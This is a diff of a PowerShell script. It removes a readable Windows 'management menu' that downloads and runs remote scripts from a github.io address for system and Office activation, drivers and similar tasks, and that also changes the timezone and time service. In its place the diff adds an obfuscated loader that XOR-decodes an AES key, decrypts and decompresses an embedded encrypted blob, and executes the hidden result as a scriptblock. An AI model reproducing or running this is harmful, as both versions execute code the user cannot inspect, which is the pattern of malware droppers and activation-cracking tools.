@@ -1,101 +1,39 @@
-#!/usr/bin/env pwsh
-
-# Windows System Management Main Menu Script
-# Provides centralized access to various management tools
-
-function Show-MainMenu {
-    Clear-Host
-    Write-Host "========================================"
-    Write-Host "Windows System Management Main Menu"
-    Write-Host "========================================"
-    Write-Host ""
-    Write-Host "Please select an operation:"
-    Write-Host ""
-    Write-Host "1) Upgrade to Professional Edition"
-    Write-Host "2) System Activation"
-    Write-Host "3) Office Management"
-    Write-Host "4) Driver Management"
-    Write-Host "5) System Hardware Assessment"
-    Write-Host ""
-    Write-Host "0) Exit"
-    Write-Host ""
-    Write-Host "========================================"
-}
-
-function Invoke-RemoteScript {
-    param(
-        [string]$Url
-    )
-
-    try {
-        $scriptContent = Invoke-RestMethod -Uri $Url -UseBasicParsing
-        Invoke-Expression -Command $scriptContent
-    }
-    catch {
-        Write-Error "Failed to load or execute remote script"
-        Write-Error "Error message: $_"
-        Write-Host "Press any key to return to main menu..."
-        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
-    }
-}
-
-function Get-MenuChoice {
-    $choice = Read-Host "Please enter option number (0-5)"
-    return $choice.Trim()
-}
-
-# Script entry point
-$baseUrl = "https://li1345825138.github.io/api"
-
-Write-Host "Initializing..."
-
-# Set timezone to Eastern Standard Time
-tzutil /s "Eastern Standard Time" 2>&1 | Out-Null
-
-# Start Windows Time service
-Start-Service w32time -ErrorAction Stop 2>&1 | Out-Null
-w32tm /config /syncfromflags:manual /manualpeerlist:"time.windows.com" 2>&1 | Out-Null
-Restart-Service w32time
-
-# Resynchronize time
-w32tm /resync 2>&1 | Out-Null
-
-do {
-  Show-MainMenu
-  $choice = Get-MenuChoice
-
-  switch ($choice) {
-      "1" {
-          Write-Host "Starting Professional Edition activation..."
-          Invoke-RemoteScript -Url "$baseUrl/pro"
-      }
-      "2" {
-          Write-Host "Starting System activation..."
-          Invoke-RemoteScript -Url "$baseUrl/act"
-      }
-      "3" {
-          Write-Host "Starting Office management..."
-          Invoke-RemoteScript -Url "$baseUrl/office"
-      }
-      "4" {
-          Write-Host "Starting Driver management..."
-          Invoke-RemoteScript -Url "$baseUrl/driver"
-      }
-      "5" {
-          Write-Host "Starting System Hardware Assessment..."
-          Invoke-RemoteScript -Url "$baseUrl/winsat_tool"
-      }
-      "6" {
-          Write-Host "Starting Apple device support..."
-          Invoke-RemoteScript -Url "$baseUrl/apple"
-      }
-      "0" {
-          Write-Host "Exiting..."
-          return
-      }
-      default {
-          Write-Host "Invalid option, please try again!"
-      }
-  }
-  Read-Host "Press Enter to continue..."
-} while ($true)
+${x482d556d} = [byte[]](@(
+    '9eftGgBt5Zg='
+    'RSIu0dMswIA='
+    'DwBEGyQm5xo='
+    '6R0BROo71ts='
+) | ForEach-Object { [Convert]::FromBase64String($_) } | ForEach-Object { $_ -bxor 96 })
+${xfd62bcd4} = @'
+nXrKfi2zDDk5e+BHoT6loaf0RRFyTeEh69529ucDAZrFDSKLV48U8LkrydzTrPJ/ZjuhHAVi74js
+g0tUof3Ed8X9KdBO+Vn+oejTLb+wfXyZSGqSggy/3nkymQKS6lFbmWXX3ZoHIgxJSmoRV9pmdYRv
+4kYrcI7MimGfOvFhunHc/nT29RBzjsk7yWlQhO5BUy+UDAQ3eOt7cIHdx6OXpsbTz0v1lX2v5ou2
++JLst6nXxlUgQXcFHycSg3nct6QXrzgCwL2SMYDnvxZki0bzv28GAxWDr2fSlIb5Nvt/2OLAGxUH
+5UlXfVSlSJ6cvSqnAdZEkvmy2JbUWLzoid2jPZrgifX+j98yuz5lXKxut3xfB0ep3SIZlvs4r+IN
+hmE0mcrmquGnLvc5MHqSrNDKA9aKBVByNBwTDrbDdoqIp0XTzQgNyipos8UwcfxyZ6itFgQpk50h
+YglDPJiNCBUTRSbbcB0JfGLhMw6Gikg3wQGkuAzedAbzPP4lVJLOFtDngQz7XocCcHzfXeIMrqGi
+fUPmkAa3tzrcH3KOfp7Pe53f//lYgj12zGUPjkynEImCtuxLmGx+oQURuc9B9Xwf43gEtRl78Tfg
+kMBgc/C+/8Ay9KARbOfXxDw2kq9cYv3Zcp6zTj7BdTYOZoCwkYjjYuFugVnxqyMeJXwYK37WjJBr
+9D5p3owEKqda7P+7cAMSWW0hJN/1MPgJCCfGBeVzrZJr/0r8JMDmueWRQj6pAvKCLLjb9qEFHvPx
+ZTbIzdLr9HZKF0+OMh09mLg3bIl/SXTkMXVfCvxYezQv6Lbs6JZ3Z4/77fKmd9X4uw7Q0TFqGHQo
+HCrHdjo8d2nbB3Z9fXfPg4oh/dQfr6jp9Hw52sLPj3jVOsdlGBF/lmJ7bn/UInYj4HJyHIC5koTf
+U3xyBs7jz2B12q+gTFFnQlnjclp4FiOk/M/H/bq8vHngUR4wqDUmTlqkJn92I+4FyinBg99GBXE/
+hQNCnc1pD/uNDUF3TDBYnX4dlr1uumkSTbLaVj5thHjqR38N0uX635hvJIt8TDeYmB4rtRFSYmdl
+h0Rw5xN3PnmxXePgXflhbYb9h0QAYmjJWTREShONC4BpjjH1Bs5th7Db+NjLZg63CU+3sdp/BDSl
+1NzCHPEw4ofnEoA58kkDlwgr6JoFFdk0Vm6A9zoLs6n1rGzN8qYGUkI0uMUsuA3xg3c4+OknXPTo
+ZrCWLyJG3BDos3fIoheccy+UKiAwOAwIP/PEzBW3OwhonRFaU/UT1uoxnrS9ZFc7YCW3dLCSBvTM
+kmOL0O3RLNSHpj7FCoe6k/pi/vyFIvf9s5KXCM/SdSKisCd4nbVa7UZR1q1y440hZ8jTkx2dpg==
+'@
+${x3a14335c} = [Convert]::FromBase64String((${xfd62bcd4} -replace '[^A-Za-z0-9+/=]', ''))
+${xe6f43a48} = [System.Security.Cryptography.Aes]::Create()
+${xe6f43a48}.Key = ${x482d556d}
+${xe6f43a48}.IV = ${x3a14335c}[0..15]
+${x10c31763} = New-Object System.IO.MemoryStream
+${x10c31763}.Write(${x3a14335c}, 16, ${x3a14335c}.Length - 16)
+${x10c31763}.Position = 0
+${x218533b8} = New-Object System.Security.Cryptography.CryptoStream(${x10c31763}, ${xe6f43a48}.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
+${xa3cff9f4} = New-Object System.IO.Compression.GZipStream(${x218533b8}, [System.IO.Compression.CompressionMode]::Decompress)
+${xd1516236} = New-Object System.IO.StreamReader(${xa3cff9f4}, [System.Text.Encoding]::UTF8)
+${x684f53f3} = ${xd1516236}.ReadToEnd()
+${xd1516236}.Dispose(); ${xa3cff9f4}.Dispose(); ${x218533b8}.Dispose(); ${x10c31763}.Dispose(); ${xe6f43a48}.Dispose()
+. ([scriptblock]::Create(${x684f53f3}))
